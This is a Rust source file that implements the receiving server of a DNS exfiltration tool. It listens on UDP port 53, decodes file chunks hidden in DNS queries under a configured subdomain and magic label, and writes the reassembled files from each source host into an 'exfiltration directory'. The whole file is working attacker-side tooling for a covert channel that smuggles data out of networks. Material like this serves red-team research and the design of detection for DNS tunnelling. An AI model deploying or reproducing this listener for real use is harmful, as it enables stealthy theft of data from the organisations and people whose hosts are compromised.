use std::fs::File;
use std::io::Write;
use std::io;
use std::net::{Ipv4Addr, SocketAddrV4, UdpSocket};
use std::path::Path;

use log::{debug, error, info, warn};
use structopt::StructOpt;
use trust_dns_proto::rr::{Name, Record};
use trust_dns_proto::rr::domain::Label;
use trust_dns_proto::serialize::binary::{BinDecodable, BinDecoder, BinEncodable, BinEncoder};

use dns_encoding::decode::{MessageDecoder};
use dns_encoding::server::{ServerState, TransmissionState};

#[derive(Debug, StructOpt)]
#[structopt(name = "dns-exfiltrating-client", about = "An client to exfiltrate files via dns.")]
struct ServerOptions {
    #[structopt(short, long)]
    exfiltration_directory: String,

    #[structopt(short, long)]
    sub_domain: String,

    #[structopt(short, long, default_value = "8k1")]
    magic_nr: String,

    #[structopt(short, long, default_value = "53")]
    port: u16,
}

fn main() {
    env_logger::init();

    let opt: ServerOptions = ServerOptions::from_args();
    info!("opt = {:?}", opt);
    let exfiltration_path = Path::new(&opt.exfiltration_directory);
    assert!(exfiltration_path.exists(), "Exfiltration directory must exist");
    let address = SocketAddrV4::new(Ipv4Addr::UNSPECIFIED, opt.port);
    let socket = UdpSocket::bind(address).expect("Cant bind to socket");
    let mut buffer = vec![0 as u8; 1024];
    let mut send_buffer = Vec::with_capacity(1024);

    let magic_nr = Label::from_ascii(opt.magic_nr.as_str()).expect("Magic nr must be valid dns label");
    let sub_domain = Name::from_ascii(opt.sub_domain.as_str()).expect("Subdomain must be valid dns name");
    let message_decoder = MessageDecoder::new(magic_nr, sub_domain);

    let mut server_state = ServerState::new();

    loop {
        let (bytes_read, source) = match socket.recv_from(&mut buffer) {
            Ok(result) => result,
            Err(e) => {
                error!("Failed to receive message, error: {:?}", e);
                continue;
            }
        };
        debug!("Received from {}: Message with {} bytes", source, bytes_read);

        let mut bin_decoder = BinDecoder::new(&buffer);
        let mut dns_message = match trust_dns_proto::op::Message::read(&mut bin_decoder) {
            Ok(result) => result,
            Err(e) => {
                error!("Failed to decode dns message, error: {:?}", e);
                continue;
            }
        };
        debug!("Received dns message = {:?}", dns_message);
        let message = match message_decoder.decode(&dns_message) {
            Ok(result) => result,
            Err(e) => {
                error!("Failed to decode information from dns message, error: {:?}", e);
                continue;
            }
        };
        debug!("Decoded message = {:?}", message);

        match server_state.handle_message(message) {
            Ok(response) => {
                debug!("Responding with: {:?}", response);
                let r_data = response.encode();
                let name = dns_message.queries().get(0).unwrap().name().clone();
                dns_message.add_answer(Record::from_rdata(name, 120, r_data));
                let mut bin_encoder = BinEncoder::new(&mut send_buffer);
                dns_message.emit(&mut bin_encoder).unwrap();
                match socket.send_to(&send_buffer, source) {
                    Ok(_) => {}
                    Err(e) => {
                        error!("Failed to send response, error: {:?}", e);
                        send_buffer.clear();
                        continue;
                    }
                }
                send_buffer.clear();
            }
            Err(e) => {
                warn!("Server error: {:?}", e);
                continue;
            }
        }

        write_finished_states(&exfiltration_path, &mut server_state.finished_states);
    }
}

fn write_state(exfiltration_path: &Path, state: &TransmissionState) -> io::Result<()> {
    let target_path = exfiltration_path.join(&state.name);
    let mut file = File::create(target_path)?;
    file.write_all(&state.data)
}

fn write_finished_states(exfiltration_path: &Path, finished_states: &mut Vec<TransmissionState>) {
    for state in finished_states.iter() {
        match write_state(&exfiltration_path, &state) {
            Ok(()) => { info!("Successfully received file '{}' from host {}", state.name, state.host) }
            Err(e) => { error!("Failed to write file '{}' from host {}. Error: {}", state.name, state.host, e) }
        }
    }
    finished_states.clear();
}
